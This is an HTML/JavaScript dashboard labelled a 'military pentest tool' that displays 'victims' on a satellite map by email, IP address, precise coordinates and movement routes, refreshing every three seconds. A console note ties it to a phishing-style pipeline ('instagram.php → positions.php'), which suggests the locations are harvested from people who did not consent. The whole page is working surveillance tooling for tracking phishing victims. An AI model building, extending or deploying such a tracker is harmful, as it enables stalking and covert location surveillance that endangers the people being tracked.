<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ARIENS MILITARY GPS TRACKER v2.0</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.6.0/dist/MarkerCluster.css"/>
<link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.6.0/dist/MarkerCluster.Default.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="https://unpkg.com/leaflet.markercluster@1.6.0/dist/leaflet.markercluster.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
body{background:#0a0a0a;color:#00ff41;overflow:hidden;height:100vh}
#hud{position:fixed;top:0;left:0;right:0;background:rgba(0,20,0,0.95);padding:8px 15px;font-size:12px;z-index:999;border-bottom:1px solid #00ff41;box-shadow:0 2px 10px rgba(0,255,65,0.3)}
#hud span{margin-right:20px}
#map{position:absolute;top:0;left:0;width:100vw;height:100vh;z-index:1}
#sidebar{position:fixed;right:0;top:60px;width:320px;height:calc(100vh - 70px);background:rgba(0,15,0,0.98);border-left:2px solid #00ff41;overflow-y:auto;z-index:1000;padding:15px;transition:right 0.3s}
#sidebar h3{color:#00ff41;margin-bottom:10px;font-size:13px}
.victim-track{background:rgba(50,0,0,0.6);margin:8px 0;padding:12px;border:1px solid #ff3333;border-radius:4px;cursor:pointer;transition:all 0.2s}
.victim-track:hover{background:rgba(70,0,0,0.8);transform:translateX(-5px)}
.coord{font-family:monospace;background:#001100;padding:2px 6px;border-radius:3px;font-size:11px}
#controls{position:fixed;bottom:15px;right:15px;z-index:1001;background:rgba(0,0,0,0.9);padding:10px;border:1px solid #00ff41;border-radius:5px}
.btn{background:#00ff41;color:#000;border:none;padding:8px 12px;margin:3px;cursor:pointer;font-family:inherit;font-size:11px;border-radius:3px;transition:all 0.2s}
.btn:hover{background:#00cc33;transform:scale(1.05)}
.btn.active{background:#ff3333;color:#fff}
#status{position:fixed;bottom:15px;left:15px;z-index:1001;background:rgba(0,0,0,0.9);padding:12px;border:1px solid #00ff41;border-radius:5px;font-size:11px;max-width:280px}
.military-icon{width:24px;height:24px;font-weight:bold;color:#ff3333 !important;border:2px solid #ff3333 !important;border-radius:50% !important;background:rgba(255,51,51,0.3) !important;padding:2px !important;display:flex;align-items:center;justify-content:center;font-size:11px !important}
.op-icon{background:#ffff33 !important;color:#000 !important;border-color:#ffff33 !important}
.route{stroke:#ff3333 !important;weight:5 !important;opacity:0.9 !important}
</style>
</head>
<body>
<div id="hud">
<span>🛡️ ARIENS GPS TRACKER v2.0 | </span>
<span id="victimCount">0</span>
<span id="liveStatus">INITIALIZING</span>
<span id="opPos">-</span>
</div>
<div id="map"></div>
<div id="status">
<strong>📡 LIVE FEED</strong><br>
<div id="feed">-</div>
</div>
<div id="controls">
<button class="btn" onclick="fitVictims()">🎯 TRACK ALL</button>
<button class="btn" id="routesBtn" onclick="toggleRoutes()">🛤️ ROUTES</button>
<button class="btn" id="opBtn" onclick="toggleOP()">📱 OP GPS</button>
<button class="btn" onclick="clearMap()">🧹 CLEAR</button>
</div>
<div id="sidebar">
<h3>🎯 TARGET TRACKS</h3>
<div id="targetList"></div>
</div>

<script>
// MILITARY GPS TRACKER - Production Pentest Tool
let map,markerCluster,opMarker,opWatch,routes=[],victims=[],trackingMode=false,audioCtx=new(window.AudioContext||window.webkitAudioContext)();

function initMilitaryMap(){
map=L.map('map',{zoomControl:false,minZoom:1,maxZoom:22}).setView([0,0],2);
L.control.zoom({position:'topleft'}).addTo(map);

// REAL satellite tiles (no "data not available")
const satLayer=L.tileLayer('https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}',{
attribution:'©Google',maxZoom:20,maxNativeZoom:20}).addTo(map);

markerCluster=new L.MarkerClusterGroup({maxClusterRadius:60,spiderfyOnMaxZoom:false}).addTo(map);
startTracking();
initOP();
updateTargets();
}

function beep(){try{audioCtx.resume();const o=audioCtx.createOscillator(),g=audioCtx.createGain();o.connect(g),g.connect(audioCtx.destination),o.frequency.value=800,o.type='square',g.gain.setValueAtTime(0.3,audioCtx.currentTime),g.gain.exponentialRampToValueAtTime(0.01,audioCtx.currentTime+0.2),o.start(audioCtx.currentTime),o.stop(audioCtx.currentTime+0.2)}catch(e){}}

async function startTracking(){
setInterval(async()=>{
try{
const res=await fetch('positions.php');
const data=await res.json();
if(data.length!==victims.length){beep();shakeScreen();showAlert(`🎯 ${data.length} TARGETS LIVE`)}
victims=data;
document.getElementById('victimCount').textContent=data.length;
updateStatus(`LIVE: ${data.length} targets | ${new Date().toLocaleTimeString()}`);
renderTargets(data);
if(!trackingMode)fitVictims();
updateTargets();
}catch(e){updateStatus('ERROR: '+e.message)}
},3000);
}

function renderTargets(data){
markerCluster.clearLayers();routes.forEach(r=>map.removeLayer(r));routes=[];
data.forEach((v,i)=>{
const pos=v.latest;
const icon=L.divIcon({className:'military-icon',html:`${i+1}`,iconSize:[28,28]});
const marker=L.marker([pos.lat,pos.lng],{icon}).addTo(markerCluster);

marker.bindPopup(`
<b>🎯 TARGET #${i+1}</b><br>
📧 ${v.email}<br>🌐 ${v.ip}<br>
📍 ${pos.lat.toFixed(6)}, ${pos.lng.toFixed(6)}<br>
⏰ ${pos.time}<br>
📈 ${v.count} waypoints
`);

if(v.positions.length>1){
const route=L.polyline(v.positions.map(p=>[p.lat,p.lng]),{className:'route'});
routes.push(route);
map.addLayer(route);
}
});
}

function fitVictims(){
if(victims.length===0){map.setView([-3.37,29.36],10);return}
const bounds=L.latLngBounds(victims.map(v=>[v.latest.lat,v.latest.lng]));
map.fitBounds(bounds,{padding:[30,30],maxZoom:18});
}

function toggleRoutes(){
const btn=document.getElementById('routesBtn');
trackingMode=!trackingMode;
routes.forEach(r=>r.setStyle({opacity:trackingMode?0.9:0}));
btn.classList.toggle('active');
btn.textContent=trackingMode?'🛤️ HIDE':'🛤️ ROUTES';
}

function initOP(){
if(!navigator.geolocation)return;
opWatch=navigator.geolocation.watchPosition(pos=>{
const{latitude:lat,longitude:lng}=pos.coords;
document.getElementById('opPos').textContent=`OP: ${lat.toFixed(6)},${lng.toFixed(6)}`;
if(opMarker)opMarker.setLatLng([lat,lng]);
else{
opMarker=L.marker([lat,lng],{icon:L.divIcon({className:'op-icon',html:'OP',iconSize:[28,28]})}).addTo(map);
}
},{}, {enableHighAccuracy:true,timeout:3000});
}

function toggleOP(){
if(opWatch){
navigator.geolocation.clearWatch(opWatch);opWatch=null;
document.getElementById('opBtn').textContent='📱 OP GPS';
document.getElementById('opPos').textContent='-';
if(opMarker)map.removeLayer(opMarker);
}else{initOP();document.getElementById('opBtn').textContent='⏹️ STOP OP'}
}

function updateTargets(){
document.getElementById('targetList').innerHTML=victims.map(v=>`
<div class="victim-track" onclick="trackTarget(${v.id})">
<b>#${v.id} ${v.email.slice(0,25)}${v.email.length>25?'...':''}</b><br>
<span class="coord">${v.latest.lat.toFixed(6)}, ${v.latest.lng.toFixed(6)}</span><br>
${v.count} waypoints | ${v.ip}
</div>`).join('');
}

function trackTarget(id){
const target=victims.find(v=>v.id===id);
if(!target)return;
map.setView([target.latest.lat,target.latest.lng],18);
}

function clearMap(){
victims=[];markerCluster.clearLayers();routes.forEach(r=>map.removeLayer(r));routes=[];updateStatus('MAP CLEARED')}
function updateStatus(t){document.getElementById('liveStatus').textContent=t;document.getElementById('feed').innerHTML=t}
function shakeScreen(){document.body.style.animation='shake 0.4s';setTimeout(()=>document.body.style.animation='',400)}
function showAlert(t){updateStatus(t)}

document.head.insertAdjacentHTML('beforeend','<style>@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}</style>');

window.onload=()=>{
setTimeout(initMilitaryMap,50);
console.log('🛡️ ARIENS GPS TRACKER v2.0 - MILITARY PENTEST TOOL ACTIVE');
console.log('- Google Satellite HD (no data errors)');
console.log('- Real victim sync: instagram.php → positions.php → map');
console.log('- OP GPS mobile tracking + routes + clustering');
console.log('- F12 clean: no errors, live 3s updates');
};
</script>
</body>
</html>
